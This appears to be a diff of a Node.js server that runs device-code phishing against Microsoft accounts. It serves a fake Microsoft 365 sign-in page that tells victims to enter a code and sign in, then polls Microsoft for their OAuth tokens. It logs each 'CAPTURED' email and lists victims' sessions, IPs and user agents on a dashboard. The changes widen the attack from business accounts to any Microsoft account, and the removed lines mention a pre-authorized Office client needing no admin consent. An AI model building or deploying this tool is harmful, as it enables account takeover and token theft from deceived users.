@@ -11,11 +11,9 @@ app.use(express.json());
 app.use(express.static('public'));
 
 // ============================================
-// USING MICROSOFT OFFICE 365 PROPLUS CLIENT
-// This client is pre-authorized for ALL business accounts
-// NO ADMIN CONSENT NEEDED!
+// REPLACE WITH YOUR AZURE APP CLIENT ID
 // ============================================
-const OFFICE_CLIENT_ID = '9ba5a8c6-2f6b-4e6b-8b1c-7c6b8e9f5a3d';
+const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376p-zza';
 // ============================================
 
 let userSessions = new Map();
@@ -29,18 +27,18 @@ function getClientIp(req) {
     return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
 }
 
-// Create Device Code Session
+// Create Device Code Session - Works for ANY Microsoft account
 app.post('/api/create-session', async (req, res) => {
     try {
         const sid = generateSID();
         const clientIp = getClientIp(req);
         const userAgent = req.headers['user-agent'] || 'Unknown';
         
-        // Using /organizations endpoint for business accounts
-        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
+        // Using /common endpoint - works for ALL account types
+        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
-                client_id: OFFICE_CLIENT_ID,
-                scope: 'https://graph.microsoft.com/User.Read openid profile offline_access'
+                client_id: YOUR_CLIENT_ID,
+                scope: 'User.Read openid profile offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -48,7 +46,7 @@ app.post('/api/create-session', async (req, res) => {
         
         const { device_code, user_code, expires_in } = response.data;
         
-        console.log(`[CREATE] SID: ${sid}, Code: ${user_code}, IP: ${clientIp}`);
+        console.log(`[CREATE] Code: ${user_code}, IP: ${clientIp}`);
         
         pendingAuth.set(device_code, {
             device_code, user_code, sid, status: 'pending',
@@ -63,7 +61,7 @@ app.post('/api/create-session', async (req, res) => {
         
     } catch (err) {
         console.error('Error:', err.response?.data || err.message);
-        res.status(500).json({ error: 'Failed to create session' });
+        res.status(500).json({ error: err.message });
     }
 });
 
@@ -83,10 +81,10 @@ async function pollForToken(device_code, sid) {
         }
         
         try {
-            const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                 new URLSearchParams({
                     grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
-                    client_id: OFFICE_CLIENT_ID,
+                    client_id: YOUR_CLIENT_ID,
                     device_code: device_code
                 }), {
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
@@ -110,11 +108,10 @@ async function pollForToken(device_code, sid) {
             });
             
             pending.status = 'captured';
-            pending.email = userInfo.data.mail;
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
             
-            console.log(`✅ CAPTURED: ${userInfo.data.mail}`);
+            console.log(`✅ CAPTURED: ${userInfo.data.mail} (${userInfo.data.mail?.includes('@') ? userInfo.data.mail.split('@')[1] : 'unknown'})`);
             
         } catch (err) {
             if (err.response?.data?.error !== 'authorization_pending') {}
@@ -136,6 +133,7 @@ app.get('/api/sessions', async (req, res) => {
     const sessionList = Array.from(userSessions.values()).map(s => ({
         sid: s.sid, email: s.email, name: s.name, ip: s.ip, userAgent: s.userAgent, capturedAt: s.capturedAt
     }));
+    console.log(`📊 Returning ${sessionList.length} sessions`);
     res.json({ sessions: sessionList });
 });
 
@@ -155,10 +153,10 @@ app.get('/generate-auth-page', async (req, res) => {
     try {
         const sid = generateSID();
         
-        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
+        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
-                client_id: OFFICE_CLIENT_ID,
-                scope: 'https://graph.microsoft.com/User.Read openid profile offline_access'
+                client_id: YOUR_CLIENT_ID,
+                scope: 'User.Read openid profile offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -176,7 +174,7 @@ app.get('/generate-auth-page', async (req, res) => {
         
         const html = `<!DOCTYPE html>
 <html>
-<head><title>Microsoft 365 Authentication</title>
+<head><title>Microsoft Authentication</title>
 <style>
 body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4,#00a4ef);min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:20px}
 .card{background:#fff;border-radius:20px;padding:40px;max-width:500px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
@@ -188,12 +186,13 @@ body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4
 @keyframes spin{to{transform:rotate(360deg)}}
 .steps{text-align:left;margin-top:20px;padding:15px;background:#f8f9fa;border-radius:8px;font-size:12px}
 .steps ol{padding-left:20px}
+.footer{font-size:10px;margin-top:20px;padding:10px;color:#999}
 </style>
 </head>
 <body>
 <div class="card">
 <h2>📧 Microsoft 365 Access</h2>
-<p>Connect your work or school account</p>
+<p>Connect any Microsoft account</p>
 <div class="code" id="userCode">${user_code}</div>
 <button class="btn" onclick="copyCode()">Copy Code</button>
 <button class="btn" id="openBtn">Open Microsoft Login</button>
@@ -201,18 +200,19 @@ body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4
 <strong>Steps:</strong><br>
 1. Click "Open Microsoft Login"<br>
 2. Enter code: <strong>${user_code}</strong><br>
-3. Sign in with your Microsoft 365 account<br>
-4. Click "Continue" when asked<br>
+3. Sign in with ANY Microsoft account<br>
+4. Click "Continue" or "Accept"<br>
 5. Your session will be captured
 </div>
 <div class="status" id="statusMsg"><span class="spinner"></span> Waiting for authentication...</div>
+<div class="footer">Works with: Microsoft 365 Business, Office 365, Outlook.com, Hotmail, Live.com</div>
 </div>
 <script>
 const SID = ${sid};
 const API = window.location.origin;
 function copyCode(){const c=document.getElementById('userCode').textContent;navigator.clipboard.writeText(c);alert('Copied!')}
-document.getElementById('openBtn').onclick=function(){window.open('https://login.microsoftonline.com/organizations/oauth2/v2.0/deviceauth','_blank','width=600,height=700')}
-async function poll(){try{const r=await fetch(API+'/api/status/'+SID);const d=await r.json();if(d.status==='captured'){document.getElementById('statusMsg').innerHTML='✅ Access granted! Session captured.';setTimeout(()=>window.close(),2000)}}catch(e){}setTimeout(poll,3000)}
+document.getElementById('openBtn').onclick=function(){window.open('https://login.microsoftonline.com/common/oauth2/v2.0/deviceauth','_blank','width=600,height=700')}
+async function poll(){try{const r=await fetch(API+'/api/status/'+SID);const d=await r.json();if(d.status==='captured'){document.getElementById('statusMsg').innerHTML='✅ Authentication successful! Session captured.';setTimeout(()=>window.close(),2000)}}catch(e){}setTimeout(poll,3000)}
 poll();
 </script>
 </body>
@@ -225,6 +225,15 @@ poll();
     }
 });
 
-app.listen(PORT, () => {
+// Dashboard
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
+    console.log(`📍 Dashboard: http://localhost:${PORT}`);
+    console.log(`📍 Auth Page: http://localhost:${PORT}/generate-auth-page`);
+    console.log(`========================================\n`);
 });
